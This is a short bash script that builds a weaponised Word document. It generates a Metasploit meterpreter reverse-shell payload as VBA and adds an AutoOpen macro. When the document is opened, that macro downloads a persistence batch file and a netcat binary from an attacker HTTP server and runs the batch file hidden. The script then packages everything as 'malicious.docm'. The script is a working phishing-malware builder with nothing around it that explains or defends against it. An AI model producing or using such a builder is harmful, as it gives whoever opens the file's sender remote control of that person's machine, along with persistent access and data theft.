#!/bin/bash

MY_IP="10.1.1.1"
MY_PORT="4444"
HTTP_SERVER="http://10.1.1.1:8080"

# Generate VBA payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f vba > payload.vba

# Append download and execution code to payload.vba
cat <<EOT >> payload.vba

Sub AutoOpen()
Dim objXMLHTTP As Object
Dim objADOStream As Object
Dim strURL As String

' Download persistence.bat
strURL = "$HTTP_SERVER/persistence.bat"
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objADOStream = CreateObject("ADODB.Stream")
objXMLHTTP.Open "GET", strURL, False
objXMLHTTP.Send
If objXMLHTTP.Status = 200 Then
    objADOStream.Type = 1
    objADOStream.Open
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.SaveToFile "persistence.bat", 2
    objADOStream.Close
End If

' Download nc.bin
strURL = "$HTTP_SERVER/nc.bin"
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objADOStream = CreateObject("ADODB.Stream")
objXMLHTTP.Open "GET", strURL, False
objXMLHTTP.Send
If objXMLHTTP.Status = 200 Then
    objADOStream.Type = 1
    objADOStream.Open
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.SaveToFile "nc.bin", 2
    objADOStream.Close
End If

' Run persistence.bat
Shell "cmd.exe /c persistence.bat", vbHide

End Sub
EOT

# Create a new Word document
libreoffice --headless --invisible --convert-to docm:"MS Word 2007 XML" payload.vba

# Rename the converted document
mv payload.docm malicious.docm

# Clean up the payload.vba file
rm payload.vba

echo "Malicious Word document created: malicious.docm"
